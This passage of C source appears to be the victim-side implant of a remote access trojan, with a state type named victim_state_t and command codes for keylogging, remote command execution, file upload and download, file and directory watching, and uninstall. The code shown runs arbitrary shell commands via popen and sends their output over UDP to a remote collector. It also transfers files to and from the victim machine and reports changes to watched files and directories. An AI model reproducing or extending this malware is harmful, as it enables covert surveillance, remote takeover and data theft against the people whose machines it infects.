        snprintf(error, sizeof(error), "file transfer failed: %s", strerror(errno));
        return send_response(state, peer_addr, CMD_ERROR, error);
    }

    while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
        if (send_response_payload(state, peer_addr, CMD_FILE_DATA, buffer, (uint16_t)bytes_read) != 0) {
            failed = 1;
            break;
        }
    }

    if (ferror(fp)) {
        snprintf(error, sizeof(error), "file transfer failed while reading %s", path);
        fclose(fp);
        return send_response(state, peer_addr, CMD_ERROR, error);
    }

    fclose(fp);

    if (failed) {
        return -1;
    }

    snprintf(error, sizeof(error), "transferred %s", path);
    return send_response(state, peer_addr, CMD_OK, error);
}

static int begin_file_upload(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    char path[REMOTE_PATH_MAX];
    char error[RESPONSE_TEXT_MAX];

    if (copy_payload_string(payload, payload_len, "remote path", path, sizeof(path), error, sizeof(error)) != 0) {
        snprintf(message, message_len, "file upload failed: %s", error);
        return -1;
    }

    clear_upload_state(state);
    state->upload_fp = fopen(path, "wb");
    if (state->upload_fp == NULL) {
        snprintf(message, message_len, "file upload failed: %s", strerror(errno));
        return -1;
    }

    snprintf(state->upload_path, sizeof(state->upload_path), "%s", path);
    snprintf(message, message_len, "receiving %s", state->upload_path);
    return 0;
}

static int write_file_upload_chunk(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    if (state->upload_fp == NULL) {
        snprintf(message, message_len, "file upload failed: no active upload");
        return -1;
    }

    if (payload_len == 0) {
        snprintf(message, message_len, "chunk received");
        return 0;
    }

    if (fwrite(payload, 1, payload_len, state->upload_fp) != payload_len) {
        snprintf(message, message_len, "file upload failed while writing %s", state->upload_path);
        clear_upload_state(state);
        return -1;
    }

    snprintf(message, message_len, "chunk received");
    return 0;
}

static int finish_file_upload(victim_state_t *state, char *message, size_t message_len) {
    char completed_path[REMOTE_PATH_MAX];

    if (state->upload_fp == NULL) {
        snprintf(message, message_len, "file upload failed: no active upload");
        return -1;
    }

    snprintf(completed_path, sizeof(completed_path), "%s", state->upload_path);
    clear_upload_state(state);
    snprintf(message, message_len, "stored file at %s", completed_path);
    return 0;
}

static int watch_remote_file(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    watch_state_t watch;
    char path[REMOTE_PATH_MAX];
    char error[RESPONSE_TEXT_MAX];

    if (copy_payload_string(payload, payload_len, "remote file path", path, sizeof(path), error, sizeof(error)) != 0) {
        snprintf(message, message_len, "file watch failed: %s", error);
        return -1;
    }

    memset(&watch, 0, sizeof(watch));
    if (snapshot_file_watch(path, &watch) != 0) {
        snprintf(message, message_len, "file watch failed: cannot access %s", path);
        return -1;
    }

    watch.active = 1;
    snprintf(watch.path, sizeof(watch.path), "%s", path);
    state->file_watch = watch;
    snprintf(message, message_len, "watching file %s", state->file_watch.path);
    return 0;
}

static int watch_remote_directory(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    watch_state_t watch;
    char path[REMOTE_PATH_MAX];
    char error[RESPONSE_TEXT_MAX];

    if (copy_payload_string(payload, payload_len, "remote directory path", path, sizeof(path), error, sizeof(error)) != 0) {
        snprintf(message, message_len, "directory watch failed: %s", error);
        return -1;
    }

    memset(&watch, 0, sizeof(watch));
    if (snapshot_directory_watch(path, &watch) != 0) {
        snprintf(message, message_len, "directory watch failed: cannot access %s", path);
        return -1;
    }

    watch.active = 1;
    snprintf(watch.path, sizeof(watch.path), "%s", path);
    state->directory_watch = watch;
    snprintf(message, message_len, "watching directory %s", state->directory_watch.path);
    return 0;
}

static int snapshot_file_watch(const char *path, watch_state_t *watch) {
    struct stat st;

    if (stat(path, &st) != 0 || !S_ISREG(st.st_mode)) {
        return -1;
    }

    watch->exists = 1;
    watch->mtime = st.st_mtime;
    watch->size = st.st_size;
    return 0;
}

static int snapshot_directory_watch(const char *path, watch_state_t *watch) {
    int exists = 0;
    time_t mtime = 0;
    uint64_t signature;

    signature = compute_directory_signature(path, &exists, &mtime);
    if (!exists) {
        return -1;
    }

    watch->exists = 1;
    watch->mtime = mtime;
    watch->signature = signature;
    return 0;
}

static uint64_t compute_directory_signature(const char *path, int *exists, time_t *mtime) {
    DIR *dir;
    struct dirent *entry;
    struct stat dir_stat;
    uint64_t hash = 1469598103934665603ULL;

    *exists = 0;
    *mtime = 0;

    if (stat(path, &dir_stat) != 0 || !S_ISDIR(dir_stat.st_mode)) {
        return 0;
    }

    dir = opendir(path);
    if (dir == NULL) {
        return 0;
    }

    *exists = 1;
    *mtime = dir_stat.st_mtime;

    while ((entry = readdir(dir)) != NULL) {
        char child_path[REMOTE_PATH_MAX * 2];
        struct stat st;
        const unsigned char *name = (const unsigned char *)entry->d_name;

        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        while (*name != '\0') {
            hash ^= *name++;
            hash *= 1099511628211ULL;
        }

        if (snprintf(child_path, sizeof(child_path), "%s/%s", path, entry->d_name) >= (int)sizeof(child_path)) {
            continue;
        }

        if (stat(child_path, &st) == 0) {
            hash ^= (uint64_t)st.st_mtime;
            hash *= 1099511628211ULL;
            hash ^= (uint64_t)st.st_size;
            hash *= 1099511628211ULL;
            hash ^= (uint64_t)st.st_mode;
            hash *= 1099511628211ULL;
        }
    }

    closedir(dir);
    return hash;
}

static void send_watch_event(victim_state_t *state, const char *label, const char *path, const char *details) {
    network_message_t message;

    if (!state->session_active) {
        return;
    }

    memset(&message, 0, sizeof(message));
    message.message_type = MSG_DIRECTORY_EVENT;
    snprintf(message.payload, sizeof(message.payload), "%s: %s (%s)", label, path, details);
    message.payload_len = (int)strnlen(message.payload, sizeof(message.payload));
    (void)send_console_message(&state->allowed_addr, &message);
}

static int execute_console_command(const struct in_addr *collector_addr, const char *command) {
    FILE *pipe;
    network_message_t message;
    int status;
    int sent_output = 0;

    pipe = popen(command, "r");
    if (pipe == NULL) {
        char error[FILE_CHUNK];
        size_t error_len;

        snprintf(error, sizeof(error), "command failed: popen: %s\n", strerror(errno));
        error_len = strnlen(error, sizeof(error));

        memset(&message, 0, sizeof(message));
        message.message_type = MSG_COMMAND_OUTPUT;
        message.payload_len = (int)error_len;
        memcpy(message.payload, error, error_len);
        (void)send_console_message(collector_addr, &message);

        memset(&message, 0, sizeof(message));
        message.message_type = MSG_COMMAND_OUTPUT;
        (void)send_console_message(collector_addr, &message);
        return -1;
    }

    memset(&message, 0, sizeof(message));
    message.message_type = MSG_COMMAND_OUTPUT;

    while (fgets(message.payload, sizeof(message.payload), pipe) != NULL) {
        sent_output = 1;
        message.payload_len = (int)strnlen(message.payload, sizeof(message.payload));
        if (send_console_message(collector_addr, &message) != 0) {
            pclose(pipe);
            return -1;
        }
        usleep(2000);
        memset(message.payload, 0, sizeof(message.payload));
    }

    status = pclose(pipe);

    if (!sent_output) {
        static const char no_output[] = "(no output)\n";

        memset(&message, 0, sizeof(message));
        message.message_type = MSG_COMMAND_OUTPUT;
        message.payload_len = (int)(sizeof(no_output) - 1);
        memcpy(message.payload, no_output, sizeof(no_output) - 1);
        if (send_console_message(collector_addr, &message) != 0) {
            return -1;
        }
    }

    if (status == -1) {
        char error[FILE_CHUNK];
        size_t error_len;

        snprintf(error, sizeof(error), "command failed: pclose: %s\n", strerror(errno));
        error_len = strnlen(error, sizeof(error));

        memset(&message, 0, sizeof(message));
        message.message_type = MSG_COMMAND_OUTPUT;
        message.payload_len = (int)error_len;
        memcpy(message.payload, error, error_len);
        if (send_console_message(collector_addr, &message) != 0) {
            return -1;
        }
    } else if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
        char status_text[FILE_CHUNK];
        size_t status_len;

        snprintf(status_text, sizeof(status_text), "command exited with status %d\n", WEXITSTATUS(status));
        status_len = strnlen(status_text, sizeof(status_text));

        memset(&message, 0, sizeof(message));
        message.message_type = MSG_COMMAND_OUTPUT;
        message.payload_len = (int)status_len;
        memcpy(message.payload, status_text, status_len);
        if (send_console_message(collector_addr, &message) != 0) {
            return -1;
        }
    }

    memset(&message, 0, sizeof(message));
    message.message_type = MSG_COMMAND_OUTPUT;
    return send_console_message(collector_addr, &message);
}

static int copy_payload_string(const uint8_t *payload, uint16_t payload_len, const char *field_name, char *out, size_t out_len, char *error, size_t error_len) {
    size_t string_len;

    if (payload == NULL || payload_len == 0) {
        snprintf(error, error_len, "missing %s", field_name);
        return -1;
    }

    string_len = bounded_strlen(payload, payload_len);
    if (string_len == payload_len) {
        snprintf(error, error_len, "%s is not NUL terminated", field_name);
        return -1;
    }

    if (string_len >= out_len) {
        snprintf(error, error_len, "%s too long", field_name);
        return -1;
    }

    memcpy(out, payload, string_len + 1);
    return 0;
}

static size_t bounded_strlen(const uint8_t *data, size_t limit) {
    size_t len = 0;

    while (len < limit && data[len] != '\0') {
        len++;
    }

    return len;
}

static int append_keylogger_audit(const char *action, const char *device_path) {
    FILE *fp;
    time_t now;

    fp = fopen(KEYLOGGER_AUDIT_FILE, "a");
    if (fp == NULL) {
        perror("fopen keylogger audit");
        return -1;
    }

    now = time(NULL);
    fprintf(fp, "%ld %s %s\n", (long)now, action, device_path);
    fclose(fp);

    return 0;
}

static int send_console_message(const struct in_addr *collector_addr, const network_message_t *message) {
    int sock;
    struct sockaddr_in collector;
    ssize_t sent;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket console");
        return -1;
    }

    memset(&collector, 0, sizeof(collector));
    collector.sin_family = AF_INET;
    collector.sin_addr = *collector_addr;
    collector.sin_port = htons(COLLECTOR_PORT);

    sent = sendto(sock, message, sizeof(*message), 0, (const struct sockaddr *)&collector, sizeof(collector));
    close(sock);

    if (sent != (ssize_t)sizeof(*message)) {
        perror("sendto console");
        return -1;
    }

    return 0;
}

static uint16_t compute_checksum(const uint8_t *data, size_t len) {
    uint32_t sum = 0;

    for (size_t i = 0; i < len; i++) {
        sum += data[i];
        if (sum >> 16) {
            sum = (sum & 0xFFFFu) + (sum >> 16);
        }
    }

    return (uint16_t)(~sum & 0xFFFFu);
}

static const char *command_name(uint8_t command) {
    switch (command) {
        case CMD_DISCONNECT:
            return "DISCONNECT";
        case CMD_HEARTBEAT:
            return "HEARTBEAT";
        case CMD_KEYLOG_START:
            return "KEYLOG_START";
        case CMD_KEYLOG_STOP:
            return "KEYLOG_STOP";
        case CMD_EXEC_CMD:
            return "EXEC_CMD";
        case CMD_EXEC_OUTPUT:
            return "EXEC_OUTPUT";
        case CMD_FILE_GET:
            return "FILE_GET";
        case CMD_FILE_DATA:
            return "FILE_DATA";
        case CMD_FILE_PUT_BEGIN:
            return "FILE_PUT_BEGIN";
        case CMD_FILE_PUT_CHUNK:
            return "FILE_PUT_CHUNK";
        case CMD_FILE_PUT_END:
            return "FILE_PUT_END";
        case CMD_WATCH_FILE:
            return "WATCH_FILE";
        case CMD_WATCH_DIR:
            return "WATCH_DIR";
        case CMD_UNINSTALL:
            return "UNINSTALL";
        case CMD_OK:
            return "OK";
        case CMD_ERROR:
            return "ERROR";
        case CMD_ACK:
            return "ACK";
        default:
            return "UNKNOWN";
    }
}
